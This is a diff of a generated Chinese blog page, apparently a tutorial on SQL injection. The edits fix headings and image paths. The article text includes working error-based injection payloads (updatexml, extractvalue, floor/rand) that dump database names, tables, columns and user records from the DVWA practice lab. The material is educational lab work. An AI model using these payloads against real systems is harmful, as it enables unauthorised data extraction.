@@ -11,8 +11,8 @@
   <meta itemprop="name" content="SQL注入篇">
   <meta itemprop="description" content="SQL 注入篇 SQL 注入常用函数 1 2 3 4 5 1.联合注入函数: concat()、concat_ws()、group_concat() 2.布尔盲注函数: length()、left()、right()、substr()、mid()、ascii()、ord() 3.时间盲注函数: sleep()、if() 4.报错注入函数: floor()、exp()、updatexml()、extractvalue() (一)注入类型 SQL 注入通常分为两种类型：数字型和字符型">
   <meta itemprop="datePublished" content="2025-04-19T17:30:00+08:00">
-  <meta itemprop="dateModified" content="2025-04-19T17:48:28+08:00">
-  <meta itemprop="wordCount" content="1640"><meta property="og:url" content="http://localhost:1313/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/">
+  <meta itemprop="dateModified" content="2025-04-19T20:27:26+08:00">
+  <meta itemprop="wordCount" content="1620"><meta property="og:url" content="http://localhost:1313/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/">
   <meta property="og:site_name" content="Hinoatari BLOG">
   <meta property="og:title" content="SQL注入篇">
   <meta property="og:description" content="SQL 注入篇 SQL 注入常用函数 1 2 3 4 5 1.联合注入函数: concat()、concat_ws()、group_concat() 2.布尔盲注函数: length()、left()、right()、substr()、mid()、ascii()、ord() 3.时间盲注函数: sleep()、if() 4.报错注入函数: floor()、exp()、updatexml()、extractvalue() (一)注入类型 SQL 注入通常分为两种类型：数字型和字符型">
@@ -20,7 +20,7 @@
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
     <meta property="article:published_time" content="2025-04-19T17:30:00+08:00">
-    <meta property="article:modified_time" content="2025-04-19T17:48:28+08:00">
+    <meta property="article:modified_time" content="2025-04-19T20:27:26+08:00">
 
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="SQL注入篇">
@@ -39,8 +39,8 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "http:\/\/localhost:1313\/posts\/sql%E6%B3%A8%E5%85%A5%E7%AF%87\/"
-    },"genre": "posts","wordcount":  1640 ,
-    "url": "http:\/\/localhost:1313\/posts\/sql%E6%B3%A8%E5%85%A5%E7%AF%87\/","datePublished": "2025-04-19T17:30:00+08:00","dateModified": "2025-04-19T17:48:28+08:00","publisher": {
+    },"genre": "posts","wordcount":  1620 ,
+    "url": "http:\/\/localhost:1313\/posts\/sql%E6%B3%A8%E5%85%A5%E7%AF%87\/","datePublished": "2025-04-19T17:30:00+08:00","dateModified": "2025-04-19T20:27:26+08:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
         "@type": "Person",
@@ -116,7 +116,7 @@
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>SQL注入篇</span>
       </h1></div><div class="post-meta">
       <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
-      Hinoatari</span></span></div><div class="post-meta-line"><span title="发布于 2025-04-19 17:30:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-04-19">2025-04-19</time></span>&nbsp;<span title="更新于 2025-04-19 17:48:28"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-04-19">2025-04-19</time></span>&nbsp;<span title="1640 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1700 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 4 分钟</span>&nbsp;</div>
+      Hinoatari</span></span></div><div class="post-meta-line"><span title="发布于 2025-04-19 17:30:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-04-19">2025-04-19</time></span>&nbsp;<span title="更新于 2025-04-19 20:27:26"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-04-19">2025-04-19</time></span>&nbsp;<span title="1620 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1700 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 4 分钟</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -127,15 +127,15 @@
     <li><a href="#sql-注入常用函数">SQL 注入常用函数</a></li>
     <li><a href="#一注入类型">(一)注入类型</a>
       <ul>
-        <li><a href="#1注入类型为数字型时sql-查询语句通常为">**(1)**注入类型为数字型时，SQL 查询语句通常为：</a></li>
-        <li><a href="#2注入类型为字符型时sql-查询语句通常为">**(2)**注入类型为字符型时，SQL 查询语句通常为：</a></li>
+        <li><a href="#1注入类型为数字型时sql-查询语句通常为">(1)注入类型为数字型时，SQL 查询语句通常为：</a></li>
+        <li><a href="#2注入类型为字符型时sql-查询语句通常为">(2)注入类型为字符型时，SQL 查询语句通常为：</a></li>
       </ul>
     </li>
     <li><a href="#二报错注入">(二)报错注入</a>
       <ul>
-        <li><a href="#一sql-报错注入常用函数">**一、**SQL 报错注入常用函数：</a></li>
-        <li><a href="#二updatexml-函数实战基于-dvwa-靶场">**二、**updatexml 函数实战（基于 dvwa 靶场）</a></li>
-        <li><a href="#三extractvalue-函数实战基于-dvwa-靶场">**三、**extractvalue 函数实战（基于 dvwa 靶场）</a></li>
+        <li><a href="#一sql-报错注入常用函数">一、SQL 报错注入常用函数：</a></li>
+        <li><a href="#二updatexml-函数实战基于-dvwa-靶场">二、updatexml 函数实战（基于 dvwa 靶场）</a></li>
+        <li><a href="#三extractvalue-函数实战基于-dvwa-靶场">三、extractvalue 函数实战（基于 dvwa 靶场）</a></li>
         <li><a href="#四floor-函数实战-基于-dvwa-靶场">四、floor 函数实战 (基于 dvwa 靶场)</a></li>
       </ul>
     </li>
@@ -169,7 +169,7 @@
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
 </h2><p>SQL 注入通常分为两种类型：数字型和字符型</p>
-<h3 id="1注入类型为数字型时sql-查询语句通常为" class="heading-element"><span>**(1)**注入类型为数字型时，SQL 查询语句通常为：</span>
+<h3 id="1注入类型为数字型时sql-查询语句通常为" class="heading-element"><span>(1)注入类型为数字型时，SQL 查询语句通常为：</span>
   <a href="#1%e6%b3%a8%e5%85%a5%e7%b1%bb%e5%9e%8b%e4%b8%ba%e6%95%b0%e5%ad%97%e5%9e%8b%e6%97%b6sql-%e6%9f%a5%e8%af%a2%e8%af%ad%e5%8f%a5%e9%80%9a%e5%b8%b8%e4%b8%ba" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
@@ -184,7 +184,7 @@
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="p">.</span><span class="w"> </span><span class="o">?</span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="c1">--+ 若无报错，继续下一步
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">2</span><span class="p">.</span><span class="w"> </span><span class="o">?</span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="c1">--+ 若报错， 则注入类型为数字型</span></span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="2注入类型为字符型时sql-查询语句通常为" class="heading-element"><span>**(2)**注入类型为字符型时，SQL 查询语句通常为：</span>
+</div><h3 id="2注入类型为字符型时sql-查询语句通常为" class="heading-element"><span>(2)注入类型为字符型时，SQL 查询语句通常为：</span>
   <a href="#2%e6%b3%a8%e5%85%a5%e7%b1%bb%e5%9e%8b%e4%b8%ba%e5%ad%97%e7%ac%a6%e5%9e%8b%e6%97%b6sql-%e6%9f%a5%e8%af%a2%e8%af%ad%e5%8f%a5%e9%80%9a%e5%b8%b8%e4%b8%ba" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
@@ -203,7 +203,7 @@
   <a href="#%e4%ba%8c%e6%8a%a5%e9%94%99%e6%b3%a8%e5%85%a5" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><h3 id="一sql-报错注入常用函数" class="heading-element"><span>**一、**SQL 报错注入常用函数：</span>
+</h2><h3 id="一sql-报错注入常用函数" class="heading-element"><span>一、SQL 报错注入常用函数：</span>
   <a href="#%e4%b8%80sql-%e6%8a%a5%e9%94%99%e6%b3%a8%e5%85%a5%e5%b8%b8%e7%94%a8%e5%87%bd%e6%95%b0" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
@@ -244,52 +244,51 @@
 <li>count(*) 是一个聚合函数，用来计算表中所有行的数量，floor(rand(0)*2)产生的固定序列为：<strong>01101</strong>，结合 group by 会产生一个虚拟表。</li>
 <li>原理：rand 伪随机函数与<strong>order by</strong>或<strong>group by</strong>函数的冲突，例如 floor(rand(0)*2)一开始计算得到了 0，group by 根据 0 分类统计，在写入要返回的虚表时 floor(rand(0)*2)还要计算一次结果，这次结果却是 1，导致了冲突。</li>
 </ul>
-<h3 id="二updatexml-函数实战基于-dvwa-靶场" class="heading-element"><span>**二、**updatexml 函数实战（基于 dvwa 靶场）</span>
+<h3 id="二updatexml-函数实战基于-dvwa-靶场" class="heading-element"><span>二、updatexml 函数实战（基于 dvwa 靶场）</span>
   <a href="#%e4%ba%8cupdatexml-%e5%87%bd%e6%95%b0%e5%ae%9e%e6%88%98%e5%9f%ba%e4%ba%8e-dvwa-%e9%9d%b6%e5%9c%ba" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
 </h3><p>1.爆数据库和用户名：<code>1' and updatexml(1,concat(0x7e,database(),0x7e,user()),1)#</code></p>
-<p>输出结果： <img loading="lazy" src='F:\hugoblog\blog\static\images\sql注入篇\1.png' alt="测试结果"></p>
+<p>输出结果： <img loading="lazy" src='images/sql注入篇/1.png' alt="测试结果"></p>
 <p>2.爆当前数据库的表信息：<code>1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1)#</code></p>
-<p>输出结果： <img loading="lazy" src='F:\hugoblog\blog\static\images\sql注入篇\2.png' alt="测试结果"></p>
+<p>输出结果： <img loading="lazy" src='images/sql注入篇/2.png' alt="测试结果"></p>
 <p>3.爆 dvwa 数据库中的 user 表的字段信息：<code>1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'),0x7e),1)#</code></p>
-<p>输出结果： <img loading="lazy" src='F:\hugoblog\blog\static\images\sql注入篇\3.png' alt="测试结果"></p>
+<p>输出结果： <img loading="lazy" src='images/sql注入篇/3.png' alt="测试结果"></p>
 <p>4.爆数据库内容：<code>1' and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users),0x7e),1)#</code></p>
-<p>输出结果： <img loading="lazy" src='F:\hugoblog\blog\static\images\sql注入篇\4.png' alt="测试结果"></p>
-<h3 id="三extractvalue-函数实战基于-dvwa-靶场" class="heading-element"><span>**三、**extractvalue 函数实战（基于 dvwa 靶场）</span>
+<p>输出结果： <img loading="lazy" src='images/sql注入篇/4.png' alt="测试结果"></p>
+<h3 id="三extractvalue-函数实战基于-dvwa-靶场" class="heading-element"><span>三、extractvalue 函数实战（基于 dvwa 靶场）</span>
   <a href="#%e4%b8%89extractvalue-%e5%87%bd%e6%95%b0%e5%ae%9e%e6%88%98%e5%9f%ba%e4%ba%8e-dvwa-%e9%9d%b6%e5%9c%ba" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
 </h3><p>1.爆数据库和用户名：<code>1' and extractvalue(1,concat(0x7e,database(),0x7e,user()))#</code></p>
-<p>输出结果： <img loading="lazy" src='F:\hugoblog\blog\static\images\sql注入篇\1.png' alt="测试结果"></p>
+<p>输出结果： <img loading="lazy" src='images/sql注入篇/1.png' alt="测试结果"></p>
 <p>2.爆当前数据库的表信息：<code>1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database())))#</code></p>
-<p>输出结果： <img loading="lazy" src='F:\hugoblog\blog\static\images\sql注入篇\2.png' alt="测试结果"></p>
+<p>输出结果： <img loading="lazy" src='images/sql注入篇/2.png' alt="测试结果"></p>
 <p>3.爆 dvwa 数据库中的 user 表的字段信息：<code>1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = 'dvwa' and table_name = 'users')))#</code></p>
-<p>输出结果： <img loading="lazy" src='F:\hugoblog\blog\static\images\sql注入篇\3.png' alt="测试结果"></p>
+<p>输出结果： <img loading="lazy" src='images/sql注入篇/3.png' alt="测试结果"></p>
 <p>4.爆数据库内容：<code>1' and extractvalue(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users),0x7e))#</code></p>
-<p>输出结果： <img loading="lazy" src='F:\hugoblog\blog\static\images\sql注入篇\4.png' alt="测试结果"></p>
+<p>输出结果： <img loading="lazy" src='images/sql注入篇/4.png' alt="测试结果"></p>
 <h3 id="四floor-函数实战-基于-dvwa-靶场" class="heading-element"><span>四、floor 函数实战 (基于 dvwa 靶场)</span>
   <a href="#%e5%9b%9bfloor-%e5%87%bd%e6%95%b0%e5%ae%9e%e6%88%98-%e5%9f%ba%e4%ba%8e-dvwa-%e9%9d%b6%e5%9c%ba" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
 </h3><p>1.判断是否存在报错注入：<code>1' union select count(*),floor(rand(0)*2) x from information_schema.tables group by x#</code></p>
-<p>输出结果： <img loading="lazy" src='F:\hugoblog\blog\static\images\sql注入篇\5.png' alt="测试结果"></p>
+<p>输出结果： <img loading="lazy" src='images/sql注入篇/5.png' alt="测试结果"></p>
 <p>确认存在报错注入</p>
 <p>2.爆当前数据库名：<code>1' union select count(*),concat(floor(rand(0)*2),database()) x from information_schema.schemata group by x #</code></p>
-<p>输出结果： <img loading="lazy" src='F:\hugoblog\blog\static\images\sql注入篇\6.png' alt="测试结果"></p>
+<p>输出结果： <img loading="lazy" src='images/sql注入篇/6.png' alt="测试结果"></p>
 <p>可以看到数据库名为 dvwa，1 是随机数</p>
 <p>3.爆当前数据库表信息：<code>1' union select count(*),concat(floor(0)*2,0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)) x from information_schema.schemata group by x#</code></p>
-<p>输出结果： <img loading="lazy" src='F:\hugoblog\blog\static\images\sql注入篇\7.png' alt="测试结果"></p>
+<p>输出结果： <img loading="lazy" src='images/sql注入篇/7.png' alt="测试结果"></p>
 <p>4.爆数据库表中字段信息：<code>1' union select count(*),concat(floor(rand(0)*2),0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users' limit 0,1)) x from information_schema.schemata group by x#</code></p>
-<p>输出结果：</p>
-<!-- raw HTML omitted -->
+<p>输出结果： <img loading="lazy" src='images/sql注入篇/8.png' alt="测试结果"></p>
 <p>5.爆数据库内容：<code>1' union select count(*),concat(floor(rand(0)*2),(select group_concat(first_name,last_name) from dvwa.users)) x from information_schema.schemata group by x#</code></p>
-<p>输出结果： <img loading="lazy" src='F:\hugoblog\blog\static\images\sql注入篇\9.png' alt="测试结果"></p>
+<p>输出结果： <img loading="lazy" src='images/sql注入篇/9.png' alt="测试结果"></p>
 </div><div class="post-footer" id="post-footer">
   <div class="post-info">
     <div class="post-info-line">
       <div class="post-info-mod">
-        <span title="更新于 2025-04-19 17:48:28">更新于 2025-04-19&nbsp;</span>
+        <span title="更新于 2025-04-19 20:27:26">更新于 2025-04-19&nbsp;</span>
       </div><div class="post-info-license">
             <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
           </div></div><div class="post-info-line">
